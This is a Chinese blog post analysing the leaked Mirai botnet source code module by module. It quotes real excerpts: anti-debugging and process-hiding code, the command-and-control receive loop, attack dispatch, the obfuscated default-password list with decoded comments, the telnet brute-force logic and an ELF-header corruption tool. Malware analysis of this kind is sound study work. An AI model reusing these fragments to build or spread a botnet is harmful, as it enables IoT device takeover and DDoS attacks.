
<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="utf-8" />
    <title>Mirai源码读后感 | 清风之恋の小窝</title>
    <meta name="author" content="清风之恋" />
    <meta name="description" content="ええ...?被找到了呢,这里会不定期更新一些好玩的东西哦" />
    <meta name="keywords" content="清风之恋,aurora0x27,aurora" />
    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
    />
    <link rel="icon" href="/images/nachoneko.png" />
    <link rel="preconnect" href="https://s4.zstatic.net" />
<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
<link rel="preconnect" href="https://fonts.googleapis.cn" />
<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
<link
    rel="stylesheet"
    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
/>
<script> const mixins = {}; </script>

<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>


<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
<link
    rel="stylesheet"
    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/vs.min.css"
/>
<script src="/js/lib/highlight.js"></script>


<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.js"></script>
<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css" />
<script src="/js/lib/math.js"></script>


<script src="/js/lib/preview.js"></script>









<link rel="stylesheet" href="/css/main.css" />

<meta name="generator" content="Hexo 7.3.0"></head>
<body>
    <div id="layout">
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>加载过慢请开启缓存 浏览器默认开启</p>
                    <img src="/images/loading.gif" />
                </div>
            </div>
        </transition>
        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
    <nav id="desktop-menu">
        <a class="title" href="/">
            <span>清风之恋の小窝</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
    </nav>
    <nav id="mobile-menu">
        <div class="title" @click="showMenuItems = !showMenuItems">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;清风之恋の小窝</span>
        </div>
        <transition name="slide">
            <div class="items" v-show="showMenuItems">
                
                <a href="/">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-house fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                    </div>
                </a>
                
                <a href="/about">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-id-card fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                    </div>
                </a>
                
                <a href="/archives">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-box-archive fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                    </div>
                </a>
                
                <a href="/categories">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-bookmark fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                    </div>
                </a>
                
                <a href="/tags">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-tags fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                    </div>
                </a>
                
            </div>
        </transition>
    </nav>
</div>
<transition name="fade">
    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
</transition>

        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
            <div class="article">
    <div>
        <h1>Mirai源码读后感</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/8/12
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            
            <span class="tag">
                
                <a href="/tags/%E5%90%B9%E6%B0%B4/" style="color: #00bcd4">
                    吹水
                </a>
            </span>
            
        </span>
        
    </div>
    
    <div class="content" v-pre>
        
    <div id="toc">
        <strong class="sidebar-title">目录</strong>
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%95%B4%E4%BD%93%E6%A6%82%E8%A6%81"><span class="toc-text">1. 整体概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%8A%A0%E8%BD%BD%E5%99%A8-loader-%E9%83%A8%E5%88%86"><span class="toc-text">2. 加载器(loader)部分</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%9C%AC%E4%BD%93payload%E9%83%A8%E5%88%86"><span class="toc-text">3. 本体payload部分</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E4%B8%BB%E6%B5%81%E7%A8%8B"><span class="toc-text">3.1 主流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-attack%E9%83%A8%E5%88%86"><span class="toc-text">3.2 attack部分</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-killer%E9%83%A8%E5%88%86"><span class="toc-text">3.3 killer部分</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-scanner%E9%83%A8%E5%88%86"><span class="toc-text">3.4 scanner部分</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-5-%E5%85%B6%E4%BB%96%E9%83%A8%E5%88%86"><span class="toc-text">3.5 其他部分</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%8E%A7%E5%88%B6%E7%AB%AFcnc%E9%83%A8%E5%88%86-%E4%B8%8D%E5%A4%AA%E4%BC%9Agolang-T-T"><span class="toc-text">4. 控制端cnc部分 (不太会golang T^T)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-tools%E9%83%A8%E5%88%86"><span class="toc-text">5. tools部分</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-enc-c-%E2%80%93-%E5%8A%A0%E5%AF%86%E5%87%BD%E6%95%B0"><span class="toc-text">5.1 enc.c – 加密函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-nogdb-c-%E2%80%93-%E9%98%B2%E6%AD%A2gdb%E8%B0%83%E8%AF%95"><span class="toc-text">5.2 nogdb.c – 防止gdb调试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E4%BB%A3%E7%A0%81%E9%A3%8E%E6%A0%BC"><span class="toc-text">6. 代码风格</span></a></li></ol>
    </div>


        <p>我阅读了Mirai的源码, 并惊叹于C语言的巧妙之处</p>
<span id="more"></span>

<h2 id="1-整体概要"><a href="#1-整体概要" class="headerlink" title="1. 整体概要"></a>1. 整体概要</h2><p>Mirai是一种被用于进行DDos攻击的恶意软件, 能够感染多种架构, 特点是服务端进行分发, 而不是病毒本身进行复制感染, 有白名单功能, 并可以清除异己.</p>
<p>主要的目录结构为:</p>
<pre><code class="sh">Mirai-Source-Code
├── dlr
│   └── release
├── loader -&gt; 加载器
│   ├── bins -&gt; 预编译完成的各架构可执行文件
│   └── src
│       └── headers
├── mirai -&gt; 本体
│   ├── bot -&gt; 被控制端(payload)
│   ├── cnc -&gt; 控制端
│   └── tools -&gt; 包含一些工具, 如加密, 监听scanner部分发信
└── scripts
    └── images
</code></pre>
<h2 id="2-加载器-loader-部分"><a href="#2-加载器-loader-部分" class="headerlink" title="2. 加载器(loader)部分"></a>2. 加载器(loader)部分</h2><p>loader部分目录结构</p>
<pre><code class="sh">Mirai-Source-Code/loader
├── bins -&gt; 完成预编译的各架构payload
│   ├── dlr.arm
│   ├── dlr.arm7
│   ├── dlr.m68k
│   ├── dlr.mips
│   ├── dlr.mpsl
│   ├── dlr.ppc
│   ├── dlr.sh4
│   ├── dlr.spc
│   └── dlr.x86
├── build.debug.sh
├── build.sh
└── src
    ├── binary.c -&gt; 加载bin目录下的二进制文件
    ├── connection.c -&gt; 处理登陆操作
    ├── headers
    │   ├── binary.h
    │   ├── connection.h
    │   ├── includes.h
    │   ├── server.h
    │   ├── telnet_info.h
    │   └── util.h
    ├── main.c -&gt; 入口函数
    ├── server.c -&gt; 建立连接, 使用telnet协议进行连接, 发送payload
    ├── telnet_info.c -&gt; 解析telnet_info
    └── util.c -&gt; 一些函数, 如字符串处理, 套接字读写, 套接字绑定等
</code></pre>
<p>loader部分主要用于将对应架构的payload文件(在bin目录下)加载到受感染的机器上, Mirai基于telnet协议进行攻击, 其中重要的数据结构是<br><code>struct server</code> , 其抽象了telnet连接, 并提供了完整的函数, 进行了类似面向对象的封装, 以下是 <code>server.h</code> 中定义的函数</p>
<pre><code class="c">
// &quot;构造和析构&quot;
struct server *server_create(uint8_t threads, uint8_t addr_len, ipv4_t *addrs, uint32_t max_open, char *wghip, port_t wghp, char *thip);
void server_destroy(struct server *srv);

// 主事件循环中根据telnet_info去创建新的连接
void server_queue_telnet(struct server *srv, struct telnet_info *info);

// 由上一个函数调用, 执行具体创建连接的行为
void server_telnet_probe(struct server *srv, struct telnet_info *info);

 
// 下面这些函数主要在以上四个函数中调用, 是不向外暴露的接口
static void bind_core(int core);

static void *worker(void *arg);

static void handle_output_buffers(struct server_worker *);

static void handle_event(struct server_worker *wrker, struct epoll_event *ev);

static void *timeout_thread(void *);
</code></pre>
<h2 id="3-本体payload部分"><a href="#3-本体payload部分" class="headerlink" title="3. 本体payload部分"></a>3. 本体payload部分</h2><p>本体的源码路径在 <code>/mirai/bot</code> , 是在被攻击机器(客户机)上执行的代码.</p>
<pre><code class="sh">Mirai-Source-Code/mirai/bot
├── attack_app.c
├── attack.c --------&gt; 执行Dos攻击行为的部分, 配合其他几个 attack_*.c, 实现不同的攻击方式
├── attack_gre.c
├── attack.h
├── attack_tcp.c
├── attack_udp.c
├── checksum.c-------&gt; 校验数据和指令
├── checksum.h
├── includes.h
├── killer.c---------&gt; 用于排除异己
├── killer.h
├── main.c ----------&gt; 入口函数
├── protocol.h
├── rand.c-----------&gt; 产生随机数
├── rand.h
├── resolv.c---------&gt; 负责和DNS服务器通信, 进行域名解析
├── resolv.h
├── scanner.c--------&gt; 扫描其他可能的设备, 并将结果返回给loader模块, 进行散布
├── scanner.h
├── table.c----------&gt; 维护数据表, 储存如设备ID, 受感染设备特征信息
├── table.h
├── util.c-----------&gt; 提供基础的工具函数, 如字符串处理和内存搜索
└── util.h
</code></pre>
<h3 id="3-1-主流程"><a href="#3-1-主流程" class="headerlink" title="3.1 主流程"></a>3.1 主流程</h3><ul>
<li>首先自身解除链接, 并关闭watchdog, 防止电脑重启, 并防止gdb进行调试</li>
</ul>
<pre><code class="c">// Delete self
unlink(args[0]);

// Signal based control flow
sigemptyset(&amp;sigs);
sigaddset(&amp;sigs, SIGINT);
sigprocmask(SIG_BLOCK, &amp;sigs, NULL);
signal(SIGCHLD, SIG_IGN);
signal(SIGTRAP, &amp;anti_gdb_entry);

// Prevent watchdog from rebooting device
if ((wfd = open(&quot;/dev/watchdog&quot;, 2)) != -1 ||
    (wfd = open(&quot;/dev/misc/watchdog&quot;, 2)) != -1)
&#123;
    int one = 1;

    ioctl(wfd, 0x80045704, &amp;one);
    close(wfd);
    wfd = 0;
&#125;
chdir(&quot;/&quot;);

// ......

#ifdef DEBUG
    unlock_tbl_if_nodebug(args[0]);
    anti_gdb_entry(0);
#else
    if (unlock_tbl_if_nodebug(args[0]))
        raise(SIGTRAP);
#endif
</code></pre>
<ul>
<li>隐藏自身名称和进程名</li>
</ul>
<pre><code class="c">// Hide argv0
name_buf_len = ((rand_next() % 4) + 3) * 4;
rand_alphastr(name_buf, name_buf_len);
name_buf[name_buf_len] = 0;
util_strcpy(args[0], name_buf);

// Hide process name
name_buf_len = ((rand_next() % 6) + 3) * 4;
rand_alphastr(name_buf, name_buf_len);
name_buf[name_buf_len] = 0;
prctl(PR_SET_NAME, name_buf);

// Print out system exec
table_unlock_val(TABLE_EXEC_SUCCESS);
tbl_exec_succ = table_retrieve_val(TABLE_EXEC_SUCCESS, &amp;tbl_exec_succ_len);
write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
write(STDOUT, &quot;\n&quot;, 1);
table_lock_val(TABLE_EXEC_SUCCESS);
</code></pre>
<ul>
<li><p>随后进行 <code>attack_init()</code> 和 <code>killer_init()</code> , 之后进入主事件循环</p>
</li>
<li><p>在主事件循环中先通过文件描述符 <code>fd_ctrl</code> 检查自身进程状态, 决定自身进程是否需要被杀死, 这个行为使得Mirai能够保证一台设备上只有一个自己的实例运行, 防止了反复感染同一设备, 提高了扩散效率.</p>
</li>
</ul>
<pre><code class="c">// Check if we need to kill ourselves
if (fd_ctrl != -1 &amp;&amp; FD_ISSET(fd_ctrl, &amp;fdsetrd))
&#123;
    struct sockaddr_in cli_addr;
    socklen_t cli_addr_len = sizeof (cli_addr);

    accept(fd_ctrl, (struct sockaddr *)&amp;cli_addr, &amp;cli_addr_len);

#ifdef DEBUG
    printf(&quot;[main] Detected newer instance running! Killing self\n&quot;);
#endif
#ifdef MIRAI_TELNET
    scanner_kill();
#endif
    killer_kill();
    attack_kill_all();
    kill(pgid * -1, 9);
    exit(0);
&#125;
</code></pre>
<ul>
<li>在主循环中监听CNC的信息, 并解析攻击参数</li>
</ul>
<pre><code class="c">// ......

// Try to read in buffer from CNC
errno = 0;
n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK);
if (n == -1)
&#123;
    if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
        continue;
    else
        n = 0;
&#125;

// If n == 0 then we close the connection!
if (n == 0)
&#123;
#ifdef DEBUG
    printf(&quot;[main] Lost connection with CNC (errno = %d) 2\n&quot;, errno);
#endif
    teardown_connection();
    continue;
&#125;

// Actually read buffer length and buffer data
recv(fd_serv, &amp;len, sizeof (len), MSG_NOSIGNAL);
len = ntohs(len);
recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);

#ifdef DEBUG
printf(&quot;[main] Received %d bytes from CNC\n&quot;, len);
#endif

if (len &gt; 0)
    attack_parse(rdbuf, len);
</code></pre>
<h3 id="3-2-attack部分"><a href="#3-2-attack部分" class="headerlink" title="3.2 attack部分"></a>3.2 attack部分</h3><p>attack部分主要有以下几个文件组成</p>
<pre><code>attack_app.c
attack.c
attack_gre.c
attack.h
attack_tcp.c
attack_udp.c
</code></pre>
<p>他们分别实现了不同的攻击方式, <code>attack.c</code> 负责解析攻击参数, 调用对应的函数进行特定方式的攻击</p>
<pre><code class="c">void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
&#123;
    int pid1, pid2;

    pid1 = fork();
    if (pid1 == -1 || pid1 &gt; 0)
        return;

    pid2 = fork();
    if (pid2 == -1)
        exit(0);
    else if (pid2 == 0)
    &#123;
        sleep(duration);
        kill(getppid(), 9);
        exit(0);
    &#125;
    else
    &#123;
        int i;

        for (i = 0; i &lt; methods_len; i++)
        &#123;
            if (methods[i]-&gt;vector == vector)
            &#123;
#ifdef DEBUG
                printf(&quot;[attack] Starting attack...\n&quot;);
#endif
                methods[i]-&gt;func(targs_len, targs, opts_len, opts); // 使用函数指针实现了类似重载的效果
                break;
            &#125;
        &#125;

        //just bail if the function returns
        exit(0);
    &#125;
&#125;
</code></pre>
<p>其中这个 <code>methods</code> 结构体定义如下</p>
<pre><code class="c">struct attack_method &#123;
    ATTACK_FUNC func;       // 函数指针
    ATTACK_VECTOR vector;
&#125;;
</code></pre>
<p>其中的攻击函数接口是设计统一的, 可以实现类似C++的函数重载, 多种攻击方式共用同一套接口实现, 这是部分的函数接口</p>
<pre><code class="c">void attack_udp_generic     (uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_vse         (uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_dns         (uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_plain       (uint8_t, struct attack_target *, uint8_t, struct attack_option *);
</code></pre>
<h3 id="3-3-killer部分"><a href="#3-3-killer部分" class="headerlink" title="3.3 killer部分"></a>3.3 killer部分</h3><p>killer部分只有2个文件, 其中实现了查找杀死同类程序并占用端口的行为, 向外暴露的函数只有3个: </p>
<pre><code class="c">void killer_init(void);             // 初始化函数
void killer_kill(void);
BOOL killer_kill_by_port(port_t);
</code></pre>
<p>该部分会杀死在端口22, 23, 80的进程, 并占用这三个端口, 防止端口被重新启用</p>
<h3 id="3-4-scanner部分"><a href="#3-4-scanner部分" class="headerlink" title="3.4 scanner部分"></a>3.4 scanner部分</h3><p>scanner部分会构造随机ip, 寻找可能连接的机器, 并尝试进行telnet连接, 使用23端口试图连接, 如果有回应就会尝试使用已经储存的弱密码登陆</p>
<pre><code class="c">// 源码中的部分尝试登陆
add_auth_entry(&quot;\x51\x57\x52\x52\x4D\x50\x56&quot;, &quot;\x51\x57\x52\x52\x4D\x50\x56&quot;, 5);      // support  support
add_auth_entry(&quot;\x50\x4D\x4D\x56&quot;, &quot;&quot;, 4);                                              // root     (none)
add_auth_entry(&quot;\x43\x46\x4F\x4B\x4C&quot;, &quot;\x52\x43\x51\x51\x55\x4D\x50\x46&quot;, 4);          // admin    password
add_auth_entry(&quot;\x50\x4D\x4D\x56&quot;, &quot;\x50\x4D\x4D\x56&quot;, 4);                              // root     root
add_auth_entry(&quot;\x50\x4D\x4D\x56&quot;, &quot;\x13\x10\x11\x16\x17&quot;, 4);                          // root     12345
add_auth_entry(&quot;\x57\x51\x47\x50&quot;, &quot;\x57\x51\x47\x50&quot;, 3);                              // user     user
add_auth_entry(&quot;\x43\x46\x4F\x4B\x4C&quot;, &quot;&quot;, 3);                                          // admin    (none)
add_auth_entry(&quot;\x50\x4D\x4D\x56&quot;, &quot;\x52\x43\x51\x51&quot;, 3);                              // root     pass
add_auth_entry(&quot;\x43\x46\x4F\x4B\x4C&quot;, &quot;\x43\x46\x4F\x4B\x4C\x13\x10\x11\x16&quot;, 3);      // admin    admin1234
add_auth_entry(&quot;\x50\x4D\x4D\x56&quot;, &quot;\x13\x13\x13\x13&quot;, 3);                              // root     1111
add_auth_entry(&quot;\x43\x46\x4F\x4B\x4C&quot;, &quot;\x51\x4F\x41\x43\x46\x4F\x4B\x4C&quot;, 3);          // admin    smcadmin
</code></pre>
<p>尝试登陆成功后会获取受感染机器的信息, 并发回给loader, (scannerListen.go进行处理)</p>
<pre><code class="c">            switch (conn-&gt;state)
            &#123;
            case SC_HANDLE_IACS:
                if ((consumed = consume_iacs(conn)) &gt; 0)
                &#123;
                    conn-&gt;state = SC_WAITING_USERNAME;
#ifdef DEBUG
                    printf(&quot;[scanner] FD%d finished telnet negotiation\n&quot;, conn-&gt;fd);
#endif
                &#125;
                break;
            case SC_WAITING_USERNAME:
                if ((consumed = consume_user_prompt(conn)) &gt; 0)
                &#123;
                    send(conn-&gt;fd, conn-&gt;auth-&gt;username, conn-&gt;auth-&gt;username_len, MSG_NOSIGNAL);
                    send(conn-&gt;fd, &quot;\r\n&quot;, 2, MSG_NOSIGNAL);
                    conn-&gt;state = SC_WAITING_PASSWORD;
#ifdef DEBUG
                    printf(&quot;[scanner] FD%d received username prompt\n&quot;, conn-&gt;fd);
#endif
                &#125;
                break;
            case SC_WAITING_PASSWORD:
                if ((consumed = consume_pass_prompt(conn)) &gt; 0)
                &#123;
#ifdef DEBUG
                    printf(&quot;[scanner] FD%d received password prompt\n&quot;, conn-&gt;fd);
#endif

                    // Send password
                    send(conn-&gt;fd, conn-&gt;auth-&gt;password, conn-&gt;auth-&gt;password_len, MSG_NOSIGNAL);
                    send(conn-&gt;fd, &quot;\r\n&quot;, 2, MSG_NOSIGNAL);

                    conn-&gt;state = SC_WAITING_PASSWD_RESP;
                &#125;
                break;

                    // .......

            &#125;
</code></pre>
<h3 id="3-5-其他部分"><a href="#3-5-其他部分" class="headerlink" title="3.5 其他部分"></a>3.5 其他部分</h3><pre><code>protocol.h-&gt; 网络协议相关的数据结构和宏
chechsum.c-&gt; 提供两个checksum函数, 只在scanner部分中向loader发回信息的时候才调用
chechsum.h
table.c ---&gt; 内置一份数据表, 用于随机扫描和尝试弱密码登陆, 以及数据表相关的函数
table.h
util.c ----&gt; 提供一些工具函数, 如字符串处理和获取本机ip地址
util.h
</code></pre>
<h2 id="4-控制端cnc部分-不太会golang-T-T"><a href="#4-控制端cnc部分-不太会golang-T-T" class="headerlink" title="4. 控制端cnc部分 (不太会golang T^T)"></a>4. 控制端cnc部分 (不太会golang T^T)</h2><p>cnc部分是Mirai的控制端, 主要维护数据库, 以及下达攻击指令. 目录结构如下</p>
<pre><code>mirai/cnc/
├── admin.go     ---&gt; 处理管理员登陆, 创建新用户和初始化
├── api.go       ---&gt; 向感染的节点发送命令
├── attack.go    ---&gt; 处理用户攻击请求
├── bot.go       ---&gt; bot定义和Handle()函数
├── clientList.go---&gt; 维护受感染的节点
├── constants.go ---&gt; 一段乱码, 只在这一个文件中出现, 不知道有什么用
├── database.go  ---&gt; 包括用户登录验证, 新建用户, 处理白名单等的数据库管理
└── main.go      ---&gt; 入口函数, 解析命令行参数, 确定Mirai运行扫描还是攻击的模式
</code></pre>
<blockquote>
<p>Notice<br>还在更新</p>
</blockquote>
<h2 id="5-tools部分"><a href="#5-tools部分" class="headerlink" title="5. tools部分"></a>5. tools部分</h2><p>这个部分包含了一些工具性质的代码, 每个文件自己就可以编译成一个可执行文件</p>
<pre><code>mirai/tools
├── badbot.c ------&gt; 里面有一个死循环sleep, 不知道有什么用
├── enc.c    ------&gt; 关键的加密函数
├── nogdb.c  ------&gt; 修改ELF文件头, 使得gdb无法进行调试
├── scanListen.go--&gt; 监听来自被感染设备发回的信息
├── single_load.c--&gt; 也是loader的实现
└── wget.c   ------&gt; 下载文件用的, loader会使用
</code></pre>
<h3 id="5-1-enc-c-–-加密函数"><a href="#5-1-enc-c-–-加密函数" class="headerlink" title="5.1 enc.c – 加密函数"></a>5.1 enc.c – 加密函数</h3><h3 id="5-2-nogdb-c-–-防止gdb调试"><a href="#5-2-nogdb-c-–-防止gdb调试" class="headerlink" title="5.2 nogdb.c – 防止gdb调试"></a>5.2 nogdb.c – 防止gdb调试</h3><p>nogdb.c实现了一个修改ELF文件头来达到防止gdb调试的小程序.</p>
<p>ELF是Linux下可执行文件的格式(类似于Windows下的PE格式), 他不是一种单一的格式, 而是一类格式的统称. 不同的系统采用不同种类的ELF可执行文件格式,例如Linux ELF和BSD ELF不能兼容. </p>
<p>首先了解一下ELF文件头的结构, 这里编写了一个小型的hello程序, 之后做实验要用:</p>
<pre><code class="c">// 这是elf.h中对ELF文件头的定义
typedef struct
&#123;
  unsigned char	e_ident[EI_NIDENT];	/* Magic number and other info */
  Elf32_Half	e_type;			/* Object file type */
  Elf32_Half	e_machine;		/* Architecture */
  Elf32_Word	e_version;		/* Object file version */
  Elf32_Addr	e_entry;		/* Entry point virtual address */
  Elf32_Off	e_phoff;		/* Program header table file offset */
  Elf32_Off	e_shoff;		/* Section header table file offset */
  Elf32_Word	e_flags;		/* Processor-specific flags */
  Elf32_Half	e_ehsize;		/* ELF header size in bytes */
  Elf32_Half	e_phentsize;		/* Program header table entry size */
  Elf32_Half	e_phnum;		/* Program header table entry count */
  Elf32_Half	e_shentsize;		/* Section header table entry size */
  Elf32_Half	e_shnum;		/* Section header table entry count */
  Elf32_Half	e_shstrndx;		/* Section header string table index */
&#125; Elf32_Ehdr;
</code></pre>
<p>测试程序源码</p>
<pre><code class="c">#include &lt;stdio.h&gt;

int main(int argc, char** argv) &#123;
    printf(&quot;hello\n&quot;);
    return 0;
&#125;
</code></pre>
<p>执行<code>clang -g hello.c -o hello</code>进行编译, 并使用<code>readelf</code>读取ELF文件头</p>
<pre><code class="sh">    [aurora@archlinux] ~/Desktop/notes/mirai_analyse  
    &gt; readelf -h ./hello
    ELF 头：
      Magic：  7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
      类别:                              ELF64
      数据:                              2 补码，小端序 (little endian)
      Version:                           1 (current)
      OS/ABI:                            UNIX - System V
      ABI 版本:                          0
      类型:                              DYN (Position-Independent Executable file)
      系统架构:                          Advanced Micro Devices X86-64
      版本:                              0x1
      入口点地址：              0x1040
here-&gt;程序头起点：              64 (bytes into file) # 记住这一行,之后要考
      Start of section headers:          14176 (bytes into file)
      标志：             0x0
      Size of this header:               64 (bytes)
      Size of program headers:           56 (bytes)
      Number of program headers:         13
      Size of section headers:           64 (bytes)
      Number of section headers:         37
      Section header string table index: 36
</code></pre>
<p>此时执行 <code>gdb ./hello</code> , 可以正常的调试</p>
<p>编译 <code>nogdb.c</code> 得到可执行文件, 执行 <code>./nogdb ./hello</code> 对 <code>hello</code> 进行处理, 发现不能使用gdb调试(识别不出可执行文件):</p>
<pre><code class="sh">    [aurora@archlinux] ~/Desktop/notes/mirai_analyse  
    &gt; gdb ./hello
    GNU gdb (GDB) 15.1
    Copyright (C) 2024 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
    This is free software: you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.
    Type &quot;show copying&quot; and &quot;show warranty&quot; for details.
    This GDB was configured as &quot;x86_64-pc-linux-gnu&quot;.
    Type &quot;show configuration&quot; for configuration details.
    For bug reporting instructions, please see:
    &lt;https://www.gnu.org/software/gdb/bugs/&gt;.
    Find the GDB manual and other documentation resources online at:
        &lt;http://www.gnu.org/software/gdb/documentation/&gt;.

    For help, type &quot;help&quot;.
    Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...
    Registered pretty printers for UE classes
    Registered pretty printers for UE classes
    Registered pretty printers for UE classes
  -&gt;&quot;/home/aurora/Desktop/notes/mirai_analyse/./hello&quot;: not in executable format: file format not recognized
    (gdb) l
    No symbol table is loaded.  Use the &quot;file&quot; command.
</code></pre>
<p>再次使用<code>readelf</code>读取ELF文件头</p>
<pre><code class="sh">    [aurora@archlinux] ~/Desktop/notes/mirai_analyse  
    &gt; readelf -h ./hello
    ELF 头：
      Magic：  7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
      类别:                              ELF64
      数据:                              2 补码，小端序 (little endian)
      Version:                           1 (current)
      OS/ABI:                            UNIX - System V
      ABI 版本:                          0
    readelf：错误：Reading 728 bytes extends past end of file for 程序头
      类型:                              DYN (共享目标文件)
      系统架构:                          Advanced Micro Devices X86-64
      版本:                              0x1
      入口点地址：              0x1040
here-&gt;程序头起点：              65535 (bytes into file) # 这里产生了变化
      Start of section headers:          14176 (bytes into file)
      标志：             0xffffffff
      Size of this header:               64 (bytes)
      Size of program headers:           56 (bytes)
      Number of program headers:         13
      Size of section headers:           64 (bytes)
      Number of section headers:         37
      Section header string table index: 36
    readelf：错误：Reading 728 bytes extends past end of file for 程序头
</code></pre>
<p>阅读<code>nogdb</code>内部代码得知, 他修改了三个字段: 段表偏移地址, 节表偏移地址, 程序入口地址, 导致无法调试和执行</p>
<pre><code class="c">// elf文件头中的字段
//Elf32_Off	e_shoff;		/* Section header table file offset */
//Elf32_Half	e_phnum;		/* Program header table entry count */
//Elf32_Half	e_shstrndx;		/* Section header string table index */

// 源码中修改字段
header-&gt;e_shoff = 0xffff;
header-&gt;e_shnum = 0xffff;
header-&gt;e_shstrndx = 0xffff;
</code></pre>
<h2 id="6-代码风格"><a href="#6-代码风格" class="headerlink" title="6. 代码风格"></a>6. 代码风格</h2><blockquote>
<p>Notice<br>还在更新</p>
</blockquote>

    </div>
    
    
    
    
    <div id="comment">
        <div id="giscus-container" class="giscus"></div>
    </div>
    
    
    
    
</div>

            <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2024 - 2024 清风之恋の小窝
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;清风之恋
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

        </div>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/js/main.js"></script>
    
    
<script
    src="https://giscus.app/client.js"
    data-repo="aurora0x27/aurora0x27.github.io"
    data-repo-id="R_kgDOMfB-WQ"
    data-category="Announcements"
